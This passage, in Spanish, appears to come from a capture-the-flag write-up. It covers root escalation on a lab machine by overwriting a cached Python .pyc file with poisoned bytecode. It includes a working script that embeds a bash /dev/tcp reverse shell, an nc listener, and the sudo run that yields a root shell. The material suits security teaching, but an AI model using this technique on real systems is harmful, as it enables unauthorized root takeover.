target_bytecode = '/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc'
evil_script = './extension_utils.py'

if os.path.exists(target_bytecode):
    f = open(target_bytecode, 'rb')
else:
	print('[-] No Bytecode detected, please execute sudo python_script.py to gerenate it')
	sys.exit(1)

# Extraemos los magic numbers
magic = f.read(4)
print('magic=' + ' '.join([hex(i) for i in bytearray(magic)]))

# Extraremos las flags
flags = f.read(4)
fv = int.from_bytes(flags, byteorder='little') & 0xf
print(f'hash_based={bool(fv & 0x1)}, checked_hash={bool(fv & 0x2)}, unchecked_hash={bool(fv & 0x4)}, size_based={bool(fv & 0x8)}')

# Extraemos el timestamp
timestamp = f.read(8)
t, s = struct.unpack('<LL', timestamp)
print('timestamp='+time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t)))

# Deserializacion
code = marshal.load(f)

# Codigo Python malicioso a ejecutar
payload = (
    "import os\n"
    "def validate_manifest(path):\n"
    f"    os.system(\"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'\")\n"
    "    return\n"
    "def clean_temp_files(extension_dir):\n"
    "    pass\n"
)

# Compilamos un nuevo bytecode
c2 = compile(payload, evil_script, "exec")
code2 = marshal.dumps(c2)

f.close()

# Eliminamos el bytecode si existe
if os.path.exists(target_bytecode):
    print('[*] Bytecode detected, removing...')
    os.remove(target_bytecode)

# Sobrescribimos el bytecode
with open(target_bytecode, 'wb') as outfile:
    print('[*] Writing a new poisoned Bytecode')
    outfile.write(magic + flags + timestamp + code2)

print(f"[+] Done: {target_bytecode}")
```


## Root Time

Ejecutaremos el script `hijack.py` para sobrescribir el archivo `bytecode` generado para el script `extension_utils.py`.

> Las funciones maliciosas se ejecutarán en la función `main()` del script `extension_tool.py`, por lo que solamente necesitamos ejecutarlo normalmente.
{: .notice--warning}

``` bash
larry@browsed:/tmp$ python3 hijack.py 
magic=0xcb 0xd 0xd 0xa
hash_based=False, checked_hash=False, unchecked_hash=False, size_based=False
timestamp=2025-03-23 10:56:19
[*] Bytecode detected, removing...
[*] Writing a new poisoned Bytecode
[+] Done: /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc
```

> Como el archivo `bytecode` original solamente utiliza validación por `timestamp`, el script solamente necesita copiar la marca de tiempo además del tamaño de `bytes` en el nuevo script para cumplir con este requisito.
{: .notice--warning}

Iniciaremos un listener para recibir la conexión, el puerto debe coincidir con el comando que usamos para el `bytecode`

``` bash
nc -lvnp 443
```

Para activar la ejecución de nuestro `bytecode`, necesitaremos volver a ejecutar el script con `sudo`

``` bash
larry@browsed:/tmp$ sudo /opt/extensiontool/extension_tool.py --ext Fontify
```

De forma inmediata, recibiremos una consola como el usuario `root` en nuestro listener

``` bash
Connection from 10.129.4.228:44898
root@browsed:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Ya podremos ver la última flag ubicada en el directorio `/root`

``` bash
root@browsed:/tmp# cd
root@browsed:~# cat root.txt
d79...
```

Gracias por leer, a continuación te dejo la cita del día.

> We are Divine enough to ask and we are important enough to receive.
> — Wayne Dyer
{: .notice--info}
